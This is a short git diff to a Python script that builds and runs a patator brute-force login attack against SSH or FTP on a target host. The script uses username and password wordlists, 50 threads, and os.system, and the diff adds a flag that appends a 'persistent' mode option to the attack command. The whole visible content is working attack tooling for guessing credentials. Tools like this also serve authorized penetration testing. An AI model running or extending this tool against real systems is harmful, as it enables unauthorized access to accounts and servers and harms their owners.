@@ -21,7 +21,15 @@ def main(args):
         attack_command += "ssh_login"
     else:
         attack_command += "ftp_login"
+
+    if args.persistent:
+        attack_command += " persistent=1"
+    else:
+        attack_command += " persistent=0"
+
+
     attack_command += " host=" + args.target + " user=FILE0 password=FILE1 0=/tmp/usernames.txt 1=/tmp/passwords.txt --threads 50"
+
     
     print(attack_command)
     os.system(attack_command)
@@ -34,6 +42,7 @@ if __name__ == "__main__":
     parser.add_argument("-d", "--download", action="store_true", help="Download the list from the url specified in the username and password dictionaries")
     parser.add_argument("-u", "--username_dict", default="/files/usernames.txt", help="Path to dictionary of usernames to attempt. Can be a link (use -d to download the list)")
     parser.add_argument("-p", "--password_dict", default="/files/passwords.txt", help="Path to dictionary of passwords to attempt. Can be a link (use -d to download the list)")
+    parser.add_argument("-P", "--persistent", action='store_true', help="Make the patator work in persistent mode")
 
     args = parser.parse_args()
     main(args)
